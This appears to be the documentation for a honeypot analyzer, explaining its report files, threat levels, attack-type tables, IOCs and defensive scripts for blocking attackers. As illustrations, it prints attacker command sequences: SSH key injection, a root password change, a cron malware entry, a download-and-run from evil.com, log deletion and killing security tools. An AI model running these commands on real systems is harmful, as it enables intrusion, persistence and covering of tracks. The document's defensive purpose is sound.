# Output Interpretation Guide

This guide explains how to read and use the analysis reports generated by the T-Pot Honeypot Analyzer.

## Output Directory Structure

Each analysis run creates a timestamped directory:

```
output/
â”œâ”€â”€ 20251216_162229/           # Timestamp: YYYYMMDD_HHMMSS
â”‚   â”œâ”€â”€ sessions.json          # Raw session data from Elasticsearch
â”‚   â”œâ”€â”€ sessions_for_llm.txt   # Human-readable session format
â”‚   â”œâ”€â”€ analysis_results.json  # Complete LLM analysis results
â”‚   â”œâ”€â”€ analysis_report.md     # Detailed report (all sessions)
â”‚   â””â”€â”€ analysis_report_summary.md  # Executive summary
â””â”€â”€ latest -> 20251216_162229  # Symlink to most recent run
```

## File Descriptions

### sessions.json

Raw session data extracted from T-Pot Elasticsearch. Contains all metadata and commands.

**Structure:**
```json
{
  "session_id_abc123": {
    "commands": [
      {
        "timestamp": "2025-12-15T22:25:08.459Z",
        "input": "cd ~; chattr -ia .ssh",
        "eventid": "cowrie.command.input"
      }
    ],
    "src_ip": "132.145.213.106",
    "type": "Cowrie",
    "sensor": "cb8b015da288",
    "t-pot_hostname": "honeypot-1",
    "geoip": {
      "country_name": "United States",
      "city_name": "Ashburn",
      "as_org": "ORACLE-BMC-31898",
      "asn": 31898,
      "latitude": 39.018,
      "longitude": -77.539
    },
    "start_time": "2025-12-15T22:25:08.459Z",
    "end_time": "2025-12-15T22:25:14.810Z",
    "command_count": 20
  }
}
```

**Key Fields:**

| Field | Description |
|-------|-------------|
| `session_id` | Unique session identifier from honeypot |
| `commands[]` | Array of commands in chronological order |
| `src_ip` | Attacker's source IP address |
| `type` | Honeypot type (Cowrie, Adbhoney, Dicompot) |
| `geoip` | Geographic and ASN information |
| `command_count` | Total commands in session |
| `start_time`/`end_time` | Session time boundaries |

### analysis_results.json

Complete analysis with LLM responses for each session.

**Structure:**
```json
[
  {
    "session_id": "9c3c7fe143c3",
    "src_ip": "132.145.213.106",
    "type": "Cowrie",
    "command_count": 20,
    "start_time": "2025-12-15T22:25:08.459Z",
    "end_time": "2025-12-15T22:25:14.810Z",
    "commands": [
      "cd ~; chattr -ia .ssh; lockr -ia .ssh",
      "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa ...",
      ...
    ],
    "analysis_result": {
      "success": true,
      "analysis": "## Attack Analysis\n\n**Attack Type**: Backdoor/SSH Key Injection...",
      "model": "qwen-2.5-coder-7b",
      "tokens_used": {
        "prompt_tokens": 450,
        "completion_tokens": 320,
        "total_tokens": 770
      }
    }
  }
]
```

**Use Cases:**
- Programmatic processing of results
- Integration with SIEM/SOAR systems
- Custom reporting and dashboards
- Historical trend analysis

### analysis_report.md

Detailed markdown report with full analysis of each session.

**Sections:**

1. **Report Header** - Generation timestamp and metadata
2. **Summary Statistics** - Overview metrics
3. **Session Details** - Per-session breakdown with:
   - Session metadata (IP, time, honeypot)
   - Full command list
   - LLM analysis (attack type, techniques, IOCs)
   - Threat level assessment

### analysis_report_summary.md

Executive summary designed for quick review and action.

## Understanding the Executive Summary

### Key Metrics

```markdown
| Metric | Value |
|--------|-------|
| Total Attack Sessions | 676 |
| Unique Source IPs | 281 |
| Unique Attack Patterns | 349 |
```

- **Total Sessions**: Number of distinct attacker sessions analyzed
- **Unique Source IPs**: Distinct attacker IP addresses
- **Unique Attack Patterns**: Distinct command sequence fingerprints

### Threat Level Distribution

```markdown
- ðŸ”´ **High**: 23 sessions (3.4%)
- ðŸŸ¡ **Medium**: 85 sessions (12.6%)
- ðŸŸ¢ **Low**: 32 sessions (4.7%)
- âšª **Unknown**: 536 sessions (79.3%)
```

**Threat Levels Explained:**

| Level | Criteria | Action |
|-------|----------|--------|
| **High** | Active exploitation, malware deployment, data exfiltration | Immediate investigation |
| **Medium** | Persistence mechanisms, credential theft, reconnaissance | Priority review |
| **Low** | Simple probing, failed attempts | Monitor trends |
| **Unknown** | Insufficient data or unclear intent | Manual review if pattern emerges |

### Attack Type Breakdown

```markdown
- **Reconnaissance/Probing**: 81 sessions (12.0%)
- **Backdoor/SSH Key Injection**: 23 sessions (3.4%)
- **Cryptomining**: 3 sessions (0.4%)
- **Unknown**: 569 sessions (84.2%)
```

**Common Attack Types:**

| Type | Description | Indicators |
|------|-------------|------------|
| **Reconnaissance** | System enumeration | `uname`, `cat /proc/cpuinfo`, `whoami`, `df` |
| **SSH Key Injection** | Persistent backdoor via authorized_keys | `echo "ssh-rsa..." >> .ssh/authorized_keys` |
| **Cryptomining** | Cryptocurrency miner deployment | xmrig, references to mining pools |
| **Botnet Recruitment** | Adding system to botnet | Downloads of malware, C2 callbacks |
| **Credential Theft** | Password/key harvesting | `passwd`, reading shadow files |
| **Lateral Movement** | Spreading to other systems | SSH to other hosts, network scanning |

### Top Attacking IPs

```markdown
| Rank | Source IP | Sessions | % of Total |
|------|-----------|----------|------------|
| 1 | 123.58.213.127 | 8 | 1.2% |
| 2 | 34.142.110.144 | 7 | 1.0% |
```

**Actions:**
- Add high-volume IPs to firewall blocklists
- Cross-reference with threat intelligence feeds
- Check if any match known botnets

### Attack Techniques (MITRE ATT&CK Aligned)

```markdown
- **System Reconnaissance**: 3,774 occurrences
- **SSH Key Injection**: 1,899 occurrences
- **File Attribute Manipulation**: 1,270 occurrences
```

**Technique Mapping:**

| Technique | MITRE ATT&CK | Commands |
|-----------|--------------|----------|
| System Reconnaissance | T1082 | `uname`, `/proc/cpuinfo`, `free -m` |
| SSH Key Injection | T1098.004 | `echo ssh-rsa >> authorized_keys` |
| File Attribute Manipulation | T1222 | `chattr -ia`, `chmod` |
| Password Manipulation | T1098 | `passwd`, `chpasswd` |
| Persistence via Cron | T1053.003 | `crontab`, `/etc/cron.d/` |
| Remote Download | T1105 | `wget`, `curl`, `tftp` |
| Process Termination | T1489 | `pkill`, `kill -9` |

### Indicators of Compromise (IOCs)

**SSH Keys:**
```
ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O... mdrfckr
```

**How to Use:**
```bash
# Search for this key across your infrastructure
grep -r "AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4" /home/*/.ssh/authorized_keys

# Create detection rule
# Alert if this SSH key fingerprint appears in any authorized_keys file
```

**Suspicious URLs:**
```
http://31.97.147.189/wget.sh
http://94.154.35.154/arm.uhavenobotsxd
```

**How to Use:**
- Block domains/IPs at firewall
- Add to proxy blocklists
- Create network detection rules
- Report to threat intelligence sharing platforms

### Attack Patterns

The summary identifies recurring command sequences:

```markdown
### Pattern `992190e54e5d...` â€” 223 sessions
- **Attack Type**: Backdoor/SSH Key Injection
- **Threat Level**: High
- **Unique Source IPs**: 148
- **Sample Commands**: `cd ~; chattr -ia .ssh; lockr -ia .ssh...`
```

**Interpretation:**
- **High session count + many IPs** = Automated botnet campaign
- **High session count + few IPs** = Single actor or small group
- **Pattern repetition** = Scripted/automated attack toolkit

## Analyzing Specific Sessions

### Reading a Session Analysis

```markdown
## Session 9c3c7fe143c3

**Honeypot:** Cowrie (SSH)
**Source IP:** 132.145.213.106
**Country:** United States
**ASN:** ORACLE-BMC-31898
**Time:** 2025-12-15 22:25:08 to 22:25:14 (6 seconds)
**Commands:** 20

### Commands Executed:
1. cd ~; chattr -ia .ssh; lockr -ia .ssh
2. cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3..." >> .ssh/authorized_keys
3. echo "root:fjqrH2qBHEqU"|chpasswd|bash
...

### LLM Analysis:
**Attack Type:** Backdoor/SSH Key Injection
**Threat Level:** High
**Objective:** Establish persistent access via SSH key injection
**Techniques:**
- SSH key injection (T1098.004)
- Password change for backup access
- File attribute manipulation to prevent removal

**IOCs:**
- SSH Key: ssh-rsa AAAAB3... (comment: mdrfckr)
- Password: fjqrH2qBHEqU
```

### Command Pattern Analysis

**Common Malicious Patterns:**

1. **SSH Backdoor Setup:**
```bash
cd ~; chattr -ia .ssh                    # Remove file protections
rm -rf .ssh && mkdir .ssh                # Clean slate
echo "ssh-rsa ..." >> authorized_keys    # Inject attacker's key
chmod -R go= ~/.ssh                      # Lock down permissions
```

2. **Password Change:**
```bash
echo "root:newpassword"|chpasswd         # Change root password
echo -e "old\nnew\nnew"|passwd           # Interactive password change
```

3. **Persistence via Cron:**
```bash
crontab -l                               # Check existing crons
echo "* * * * * /tmp/malware" >> /var/spool/cron/root
```

4. **Malware Download:**
```bash
cd /tmp
wget http://evil.com/malware.sh
chmod +x malware.sh
./malware.sh
```

5. **Anti-Defense:**
```bash
chattr -ia /file                         # Remove immutable flag
rm -rf /var/log/*                        # Clear logs
pkill -9 security_agent                  # Kill security tools
```

## Using Results for Defense

### Immediate Actions

1. **Block Attacking IPs:**
```bash
# Add to iptables
for ip in $(jq -r '.[].src_ip' analysis_results.json | sort -u); do
  iptables -A INPUT -s $ip -j DROP
done
```

2. **Search for IOCs:**
```bash
# Search for injected SSH keys
grep -r "mdrfckr" /home/*/.ssh/authorized_keys

# Search for suspicious files
find /tmp /var/tmp -type f -mtime -1 -executable
```

3. **Check for Persistence:**
```bash
# Check crontabs
for user in $(cut -d: -f1 /etc/passwd); do crontab -l -u $user 2>/dev/null; done

# Check authorized_keys
find /home -name authorized_keys -exec cat {} \;
```

### Integration with Security Tools

**SIEM Integration:**
```python
# Example: Send IOCs to Splunk
import json
import requests

with open('analysis_results.json') as f:
    results = json.load(f)

for session in results:
    event = {
        "source_ip": session["src_ip"],
        "attack_type": extract_attack_type(session["analysis_result"]["analysis"]),
        "threat_level": extract_threat_level(session["analysis_result"]["analysis"]),
        "commands": session["commands"]
    }
    requests.post("https://splunk:8088/services/collector", json={"event": event})
```

**Firewall Rules:**
```python
# Generate firewall rules from top attackers
import json

with open('analysis_results.json') as f:
    results = json.load(f)

ips = set(r["src_ip"] for r in results)
for ip in ips:
    print(f"iptables -A INPUT -s {ip} -j DROP")
```

### Trend Analysis

Compare reports over time to identify:

1. **New attack patterns** - Command sequences not seen before
2. **Emerging threats** - Increase in specific attack types
3. **Campaign tracking** - Same SSH keys/passwords across time
4. **Geographic shifts** - Changes in attack source countries

```python
# Compare two reports
import json

with open('output/20251215/analysis_results.json') as f:
    old = json.load(f)
with open('output/20251216/analysis_results.json') as f:
    new = json.load(f)

old_ips = set(r["src_ip"] for r in old)
new_ips = set(r["src_ip"] for r in new)

print("New attacking IPs:", new_ips - old_ips)
print("Stopped attacking:", old_ips - new_ips)
print("Persistent attackers:", old_ips & new_ips)
```

## Troubleshooting Report Quality

### High "Unknown" Classification Rate

If many sessions are classified as "Unknown":

1. **Use a larger/better LLM model** - Smaller models struggle with classification
2. **Increase `max_tokens`** - Model may be truncating responses
3. **Check session quality** - Very short sessions may lack context

### Missing IOCs

If IOCs are not being extracted:

1. **Review raw commands** - IOCs may be obfuscated
2. **Check LLM temperature** - Higher temperature = more variation
3. **Manual review** - Some attacks don't have extractable IOCs

### Inconsistent Threat Levels

Threat level assignment depends on:
- LLM model quality
- Session completeness
- Attack sophistication

For consistent scoring, consider post-processing with rule-based logic:

```python
def normalize_threat_level(analysis_text, commands):
    # High if SSH key injection or malware download
    if "ssh-rsa" in str(commands) or "wget" in str(commands):
        return "High"
    # Medium if password change or persistence
    if "chpasswd" in str(commands) or "crontab" in str(commands):
        return "Medium"
    # Low otherwise
    return "Low"
```
